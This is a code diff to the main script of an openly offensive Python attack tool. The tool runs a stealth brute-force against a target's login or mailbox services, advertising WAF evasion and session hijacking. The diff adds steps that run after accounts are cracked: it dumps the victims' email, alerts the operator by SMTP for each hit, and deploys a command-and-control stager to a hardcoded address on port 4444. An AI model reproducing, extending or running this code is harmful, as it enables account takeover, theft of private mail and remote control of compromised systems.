@@ -4,7 +4,9 @@ import time
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
 from modules.engine import run_autonomous_engine
-from modules.dumper import harvest_email_intelligence  # <--- Email intelligence dumper module
+from modules.dumper import harvest_email_intelligence
+from modules.mail import send_breach_alert
+from modules.payloads import deploy_c2_stager
 
 # Cyberpunk Neon ANSI Color Palette
 CYAN = "\033[96m"
@@ -17,7 +19,7 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 BLINK = "\033[5m"
 
-# Scaled down by 50% for optimal mobile terminal view (3 rows instead of 6)
+# Scaled down by 50% for optimal mobile terminal view (3 rows)
 BANNER = f"""{GREEN}{BOLD}
  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗ 
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
@@ -33,7 +35,7 @@ def main():
     print(BANNER)
     
     # Futuristic input prompt with strict target sanitization
-    raw_target = input(f"{CYAN}{BOLD}[SYS_PROMPT] >> Enter Target Host/Domain (e.g., BotLeg.online): {RESET}").strip()
+    raw_target = input(f"{CYAN}{BOLD}[SYS_PROMPT] >> Enter Target Host/Domain (e.g., target.com): {RESET}").strip()
     if not raw_target:
         print(f"{RED}[CRITICAL] Target parameter missing. Aborting protocol.{RESET}")
         sys.exit(1)
@@ -58,18 +60,25 @@ def main():
 
     print(f"{GREEN}[SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.{RESET}")
 
-    # Step 1: Real-time DOM & Source Code Vulnerability Audit
+    # Step 1: Real-time DOM Inspection, Security Header Audit & Session Hijacking
     asyncio.run(parse_target_source(target))
 
     print(f"{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous threads and initializing socket rings...\n{RESET}")
     time.sleep(0.5)
 
-    # Step 2: Launch Wireshark Packet Telemetry & Stealth Brute-Force Engine
+    # Step 2: Launch Wireshark Packet Telemetry & Stealth Brute-Force Engine (with WAF & Jitter Evasion)
     hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
 
-    # Step 3: If IMAP/Email vectors were cracked, execute automatic email intelligence dumping
+    # Step 3: If Mailbox/IMAP vectors were cracked, execute automatic email intelligence dumping
     if hits:
         asyncio.run(harvest_email_intelligence(target, hits))
+        
+        # Dispatch SMTP alert notification to your inbox
+        for hit in hits:
+            send_breach_alert(target, hit)
+            
+        # Compile Mobile C2 Stager package
+        deploy_c2_stager("10.0.0.100", 4444)
 
     # Cyberpunk Completion Dashboard
     print(f"\n{CYAN}═════════════════════════════════════════════════════════════{RESET}")
